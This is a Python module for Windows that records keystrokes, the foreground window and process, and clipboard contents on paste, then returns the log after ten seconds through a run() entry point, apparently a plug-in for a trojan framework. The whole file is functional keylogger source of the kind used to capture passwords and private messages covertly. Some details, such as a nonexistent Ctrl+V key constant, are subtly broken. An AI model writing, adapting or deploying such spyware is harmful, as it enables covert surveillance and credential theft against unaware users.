from pynput import keyboard
import time
from ctypes import *
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

current_window = None
log = ""
start_time = None

def get_current_process():
    global log

    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    window_title = create_string_buffer(b"\x00" * 512)
    user32.GetWindowTextA(hwnd, byref(window_title), 512)

    log += "\n\n[ PID: %d | %s | %s ]\n" % (
        pid.value,
        executable.value.decode(errors="ignore"),
        window_title.value.decode(errors="ignore"),
    )

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def on_press(key):
    global current_window
    global log

    try:
        hwnd = user32.GetForegroundWindow()
        window_title = create_string_buffer(b"\x00" * 512)
        user32.GetWindowTextA(hwnd, byref(window_title), 512)
        window_title_str = window_title.value.decode(errors="ignore")

        if window_title_str != current_window:
            current_window = window_title_str
            get_current_process()

        if hasattr(key, "char") and key.char:
            log += key.char
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.ctrl_v:
            try:
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                log += f"\n[PASTE] - {pasted_value}\n"
            except:
                log += "\n[PASTE] - (error)\n"
        else:
            log += f"[{key.name}]"
    except:
        log += "[?]"

def run(**args):
    global log
    global start_time

    log = ""
    start_time = time.time()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while time.time() - start_time < 10:
        time.sleep(0.1)

    listener.stop()
    return log or "[No keystroke recorded]"

